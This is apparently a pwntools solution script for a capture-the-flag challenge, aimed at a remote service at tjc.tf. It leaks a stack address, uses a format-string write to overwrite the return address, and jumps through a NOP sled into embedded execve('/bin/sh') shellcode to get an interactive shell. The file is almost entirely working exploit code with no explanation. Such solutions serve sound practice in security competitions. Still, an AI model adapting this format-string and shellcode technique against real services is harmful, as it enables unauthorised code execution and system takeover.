from pwn import *

context.binary = './buggy'

# p = process('./buggy')
p = remote('tjc.tf', 31363)

if args.GDB:
	gdb.attach(p)

offset = 12
offset_to_rip = 0x418

leak = p.recvline()
print(leak)
input_addr = int(leak.strip().split(b',')[0], 16)
print(hex(input_addr))

return_addr = input_addr + offset_to_rip
print(hex(return_addr))

p.sendline(b'deposit')

shellcode = b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05'
print(shellcode)
print(len(shellcode))

payload = fmtstr_payload(offset, {return_addr:input_addr+0xc8})	
payload += 80 * b'\x90'
payload += shellcode
# print(payload)

p.sendline(payload)
sleep(1)
p.sendlineafter(b'What would you like to do? (view balance|deposit|withdraw|transfer|exit', b'exit')

p.interactive()